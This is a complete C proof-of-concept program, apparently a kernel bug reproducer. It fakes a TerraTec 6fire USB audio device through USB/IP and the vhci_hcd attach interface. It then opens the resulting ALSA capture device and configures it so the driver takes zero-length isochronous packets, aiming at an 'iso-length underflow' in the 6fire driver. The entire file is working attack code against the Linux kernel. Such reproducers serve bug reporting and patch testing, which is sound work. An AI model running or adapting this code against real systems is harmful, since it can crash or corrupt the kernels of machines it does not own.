// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <sound/asound.h>

#define USBIP_CMD_SUBMIT 0x0001
#define USBIP_CMD_UNLINK 0x0002
#define USBIP_RET_SUBMIT 0x0003
#define USBIP_RET_UNLINK 0x0004

#define USBIP_DIR_OUT 0
#define USBIP_DIR_IN  1

struct usbip_header_basic {
	uint32_t command;
	uint32_t seqnum;
	uint32_t devid;
	uint32_t direction;
	uint32_t ep;
} __attribute__((packed));

struct usbip_header_cmd_submit {
	uint32_t transfer_flags;
	int32_t  transfer_buffer_length;
	int32_t  start_frame;
	int32_t  number_of_packets;
	int32_t  interval;
	unsigned char setup[8];
} __attribute__((packed));

struct usbip_header_ret_submit {
	int32_t status;
	int32_t actual_length;
	int32_t start_frame;
	int32_t number_of_packets;
	int32_t error_count;
	unsigned char pad[8];
} __attribute__((packed));

struct usbip_header {
	struct usbip_header_basic base;
	union {
		struct usbip_header_cmd_submit cmd_submit;
		struct usbip_header_ret_submit ret_submit;
	} u;
} __attribute__((packed));

struct usbip_iso_packet_descriptor {
	uint32_t offset;
	uint32_t length;
	uint32_t actual_length;
	uint32_t status;
} __attribute__((packed));

static uint32_t bs32(uint32_t v)
{
	return __builtin_bswap32(v);
}

#define COMM_EP    1
#define PCM_IN_EP  2
#define PCM_OUT_EP 6

static const unsigned char dev_desc[18] = {
	18, 0x01,
	0x00, 0x02,
	0xff, 0x00, 0x00,
	64,
	0xcd, 0x0c,
	0x80, 0x00,
	0x01, 0x01,
	0x00, 0x00, 0x00,
	0x01
};

#define CFG_TOTAL (9 + (9 + 2 * 7) + 9 + 3 * (9 + 2 * 7))

#define IF1_ALT(alt, inmax, outmax)                                      \
	9, 0x04, 1, (alt), 2, 0xff, 0x00, 0x00, 0,                       \
	7, 0x05, 0x80 | PCM_IN_EP,  0x01, (inmax) & 0xff, (inmax) >> 8, 1, \
	7, 0x05, PCM_OUT_EP,        0x01, (outmax) & 0xff, (outmax) >> 8, 1

static const unsigned char cfg_desc[CFG_TOTAL] = {

	9, 0x02, CFG_TOTAL & 0xff, CFG_TOTAL >> 8, 2, 1, 0, 0x80, 50,

	9, 0x04, 0, 0, 2, 0xff, 0x00, 0x00, 0,
	7, 0x05, 0x80 | COMM_EP, 0x03, 64, 0, 4,
	7, 0x05, COMM_EP,        0x03, 64, 0, 4,

	9, 0x04, 1, 0, 0, 0xff, 0x00, 0x00, 0,

	IF1_ALT(1, 1024, 1024),
	IF1_ALT(2, 1024, 1024),
	IF1_ALT(3, 1024, 1024),
};

static const unsigned char fw_state[8] = {
	0xeb, 0xaa, 0x55, 0x03, 0x03, 0x01, 0x00, 0x00
};

static int sock;
static volatile int iso_in_seen;

static int xread(int fd, void *buf, size_t n)
{
	size_t off = 0;

	while (off < n) {
		ssize_t r = read(fd, (char *)buf + off, n - off);

		if (r <= 0)
			return -1;
		off += r;
	}
	return 0;
}

static int xwrite(int fd, const void *buf, size_t n)
{
	size_t off = 0;

	while (off < n) {
		ssize_t r = write(fd, (const char *)buf + off, n - off);

		if (r <= 0)
			return -1;
		off += r;
	}
	return 0;
}

static void send_ret(uint32_t seqnum, uint32_t devid, uint32_t direction,
		     uint32_t ep, int32_t status, const void *data,
		     int32_t len, struct usbip_iso_packet_descriptor *iso,
		     int32_t np)
{
	struct usbip_header h;

	memset(&h, 0, sizeof(h));
	h.base.command   = bs32(USBIP_RET_SUBMIT);
	h.base.seqnum    = bs32(seqnum);
	h.base.devid     = bs32(devid);
	h.base.direction = bs32(direction);
	h.base.ep        = bs32(ep);
	h.u.ret_submit.status        = (int32_t)bs32((uint32_t)status);
	h.u.ret_submit.actual_length = (int32_t)bs32((uint32_t)len);
	h.u.ret_submit.start_frame   = 0;
	h.u.ret_submit.number_of_packets = (int32_t)bs32((uint32_t)np);
	h.u.ret_submit.error_count   = 0;

	if (xwrite(sock, &h, sizeof(h)) < 0)
		return;
	if (direction == USBIP_DIR_IN && len > 0 && data)
		if (xwrite(sock, data, len) < 0)
			return;
	if (np > 0 && iso)
		xwrite(sock, iso, np * sizeof(*iso));
}

static void handle_control(uint32_t seqnum, uint32_t devid,
			   const unsigned char *setup, int32_t buflen)
{
	unsigned int bmreq = setup[0];
	unsigned int breq  = setup[1];
	unsigned int wval  = setup[2] | (setup[3] << 8);
	unsigned int wlen  = setup[6] | (setup[7] << 8);
	unsigned char buf[512];
	int32_t len = -1;

	if (bmreq == 0x80 && breq == 0x06) {
		unsigned int type = wval >> 8;

		if (type == 0x01) {
			len = sizeof(dev_desc);
			memcpy(buf, dev_desc, len);
		} else if (type == 0x02) {
			len = sizeof(cfg_desc);
			memcpy(buf, cfg_desc, len);
		}
	} else if (bmreq == 0x80 && breq == 0x00) {
		len = 2;
		buf[0] = buf[1] = 0;
	} else if (bmreq == 0x80 && breq == 0x08) {
		len = 1;
		buf[0] = 1;
	} else if (bmreq == 0x81 && breq == 0x0a) {
		len = 1;
		buf[0] = 0;
	} else if (bmreq == 0xc0 && breq == 0x01) {
		len = sizeof(fw_state);
		memcpy(buf, fw_state, len);
	} else if ((bmreq & 0x80) == 0) {
		send_ret(seqnum, devid, USBIP_DIR_OUT, 0, 0, NULL, buflen,
			 NULL, 0);
		return;
	}

	if (len < 0) {
		send_ret(seqnum, devid, USBIP_DIR_IN, 0, -32, NULL, 0,
			 NULL, 0);
		return;
	}
	if ((unsigned int)len > wlen)
		len = wlen;
	if (len > buflen)
		len = buflen;
	send_ret(seqnum, devid, USBIP_DIR_IN, 0, 0, buf, len, NULL, 0);
}

static void *server(void *arg)
{
	struct usbip_header h;
	static unsigned char obuf[65536];
	static struct usbip_iso_packet_descriptor iso[1024];

	for (;;) {
		uint32_t cmd, seqnum, devid, dir, ep;
		int32_t buflen, np;
		int i;

		if (xread(sock, &h, sizeof(h)) < 0)
			break;

		cmd    = bs32(h.base.command);
		seqnum = bs32(h.base.seqnum);
		devid  = bs32(h.base.devid);
		dir    = bs32(h.base.direction);
		ep     = bs32(h.base.ep);

		if (cmd == USBIP_CMD_UNLINK) {
			struct usbip_header r;

			memset(&r, 0, sizeof(r));
			r.base.command = bs32(USBIP_RET_UNLINK);
			r.base.seqnum  = h.base.seqnum;
			r.base.devid   = h.base.devid;
			r.u.ret_submit.status = (int32_t)bs32((uint32_t)-104);
			xwrite(sock, &r, sizeof(r));
			continue;
		}
		if (cmd != USBIP_CMD_SUBMIT)
			continue;

		buflen = (int32_t)bs32((uint32_t)h.u.cmd_submit.transfer_buffer_length);
		np     = (int32_t)bs32((uint32_t)h.u.cmd_submit.number_of_packets);

		if (buflen < 0 || buflen > (int32_t)sizeof(obuf))
			break;
		if (dir == USBIP_DIR_OUT && buflen > 0)
			if (xread(sock, obuf, buflen) < 0)
				break;
		if (np > 0 && np <= 1024) {
			if (xread(sock, iso, np * sizeof(iso[0])) < 0)
				break;
			for (i = 0; i < np; i++) {
				iso[i].offset        = bs32(iso[i].offset);
				iso[i].length        = bs32(iso[i].length);
				iso[i].actual_length = bs32(iso[i].actual_length);
				iso[i].status        = bs32(iso[i].status);
			}
		} else {
			np = 0;
		}

		if (ep == 0) {
			handle_control(seqnum, devid, h.u.cmd_submit.setup,
				       buflen);
			continue;
		}

		if (ep == PCM_IN_EP && dir == USBIP_DIR_IN && np > 0) {

			for (i = 0; i < np; i++) {
				iso[i].actual_length = bs32(0);
				iso[i].status        = bs32(0);
				iso[i].offset        = bs32(iso[i].offset);
				iso[i].length        = bs32(iso[i].length);
			}
			iso_in_seen++;
			send_ret(seqnum, devid, dir, ep, 0, NULL, 0, iso, np);
			continue;
		}

		if (ep == PCM_OUT_EP && dir == USBIP_DIR_OUT && np > 0) {
			for (i = 0; i < np; i++) {
				iso[i].actual_length = bs32(iso[i].length);
				iso[i].status        = bs32(0);
				iso[i].offset        = bs32(iso[i].offset);
				iso[i].length        = bs32(iso[i].length);
			}
			send_ret(seqnum, devid, dir, ep, 0, NULL, 0, iso, np);
			continue;
		}

		if (ep == COMM_EP && dir == USBIP_DIR_OUT) {

			send_ret(seqnum, devid, dir, ep, 0, NULL, buflen,
				 NULL, 0);
			continue;
		}

	}
	return NULL;
}

static int vhci_attach(int sockfd)
{
	static const char *paths[] = {
		"/sys/devices/platform/vhci_hcd.0/attach",
		"/sys/bus/platform/drivers/vhci_hcd/vhci_hcd.0/attach",
		"/sys/devices/platform/vhci_hcd/attach",
		NULL
	};
	char buf[64];
	int i, fd, n;

	n = snprintf(buf, sizeof(buf), "%u %u %u %u", 0, sockfd, 1, 3);

	for (i = 0; paths[i]; i++) {
		fd = open(paths[i], O_WRONLY);
		if (fd < 0)
			continue;
		if (write(fd, buf, n) == n) {
			close(fd);
			printf("[+] attached via %s\n", paths[i]);
			return 0;
		}
		printf("[-] write %s: %s\n", paths[i], strerror(errno));
		close(fd);
	}
	return -1;
}

static void mask_set(struct snd_mask *m, unsigned int bit)
{
	memset(m, 0, sizeof(*m));
	m->bits[bit >> 5] |= 1u << (bit & 31);
}

static void iv_set(struct snd_interval *iv, unsigned int v)
{
	memset(iv, 0, sizeof(*iv));
	iv->min = iv->max = v;
	iv->integer = 1;
}

static int is_6fire_capture(int fd)
{
	struct snd_pcm_hw_params p;
	unsigned int i;

	memset(&p, 0, sizeof(p));
	for (i = 0; i < sizeof(p.masks) / sizeof(p.masks[0]); i++)
		memset(&p.masks[i], 0xff, sizeof(p.masks[i]));
	for (i = 0; i < sizeof(p.intervals) / sizeof(p.intervals[0]); i++) {
		p.intervals[i].min = 0;
		p.intervals[i].max = ~0u;
	}
	p.rmask = ~0u;
	p.cmask = 0;
	p.info = ~0u;

	if (ioctl(fd, SNDRV_PCM_IOCTL_HW_REFINE, &p) < 0)
		return 0;

	return p.intervals[SNDRV_PCM_HW_PARAM_CHANNELS -
			   SNDRV_PCM_HW_PARAM_FIRST_INTERVAL].max == 4 &&
	       p.intervals[SNDRV_PCM_HW_PARAM_RATE -
			   SNDRV_PCM_HW_PARAM_FIRST_INTERVAL].max == 192000;
}

static int open_pcm(void)
{
	char path[64];
	int card, dev, j, fd;

	for (j = 0; j < 200; j++) {
		for (card = 0; card < 8; card++)
			for (dev = 0; dev < 4; dev++) {
				snprintf(path, sizeof(path),
					 "/dev/snd/pcmC%dD%dc", card, dev);
				fd = open(path, O_RDWR);
				if (fd < 0)
					continue;
				if (is_6fire_capture(fd)) {
					printf("[+] opened %s (6fire capture)\n",
					       path);
					return fd;
				}
				close(fd);
			}
		usleep(50000);
	}
	return -1;
}

int main(void)
{
	int sv[2];
	pthread_t th;
	int fd;
	struct snd_pcm_hw_params p;
	unsigned int i;

	setvbuf(stdout, NULL, _IONBF, 0);
	printf("[*] 6fire iso-length underflow PoC\n");

	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) < 0) {
		perror("socketpair");
		return 1;
	}
	sock = sv[0];

	if (pthread_create(&th, NULL, server, NULL) != 0) {
		perror("pthread_create");
		return 1;
	}

	if (vhci_attach(sv[1]) < 0) {
		printf("[-] vhci attach failed\n");
		return 1;
	}

	fd = open_pcm();
	if (fd < 0) {
		printf("[-] no ALSA pcm device appeared\n");
		return 1;
	}

	memset(&p, 0, sizeof(p));
	for (i = 0; i < sizeof(p.masks) / sizeof(p.masks[0]); i++)
		memset(&p.masks[i], 0xff, sizeof(p.masks[i]));
	for (i = 0; i < sizeof(p.intervals) / sizeof(p.intervals[0]); i++) {
		p.intervals[i].min = 0;
		p.intervals[i].max = ~0u;
	}
	p.rmask = ~0u;
	p.cmask = 0;
	p.info  = ~0u;

	mask_set(&p.masks[SNDRV_PCM_HW_PARAM_ACCESS -
			  SNDRV_PCM_HW_PARAM_FIRST_MASK],
		 SNDRV_PCM_ACCESS_RW_INTERLEAVED);
	mask_set(&p.masks[SNDRV_PCM_HW_PARAM_FORMAT -
			  SNDRV_PCM_HW_PARAM_FIRST_MASK],
		 SNDRV_PCM_FORMAT_S32_LE);
	mask_set(&p.masks[SNDRV_PCM_HW_PARAM_SUBFORMAT -
			  SNDRV_PCM_HW_PARAM_FIRST_MASK],
		 SNDRV_PCM_SUBFORMAT_STD);
	iv_set(&p.intervals[SNDRV_PCM_HW_PARAM_CHANNELS -
			    SNDRV_PCM_HW_PARAM_FIRST_INTERVAL], 4);
	iv_set(&p.intervals[SNDRV_PCM_HW_PARAM_RATE -
			    SNDRV_PCM_HW_PARAM_FIRST_INTERVAL], 44100);
	iv_set(&p.intervals[SNDRV_PCM_HW_PARAM_PERIOD_SIZE -
			    SNDRV_PCM_HW_PARAM_FIRST_INTERVAL], 1024);
	iv_set(&p.intervals[SNDRV_PCM_HW_PARAM_PERIODS -
			    SNDRV_PCM_HW_PARAM_FIRST_INTERVAL], 2);

	if (ioctl(fd, SNDRV_PCM_IOCTL_HW_PARAMS, &p) < 0) {
		printf("[-] HW_PARAMS: %s\n", strerror(errno));
		return 1;
	}
	printf("[+] hw_params ok\n");

	if (ioctl(fd, SNDRV_PCM_IOCTL_PREPARE, 0) < 0)
		printf("[-] PREPARE: %s\n", strerror(errno));
	else
		printf("[+] prepare ok\n");

	printf("[*] iso IN urbs answered: %d\n", iso_in_seen);
	sleep(5);
	printf("[*] done (no crash?)\n");
	return 0;
}
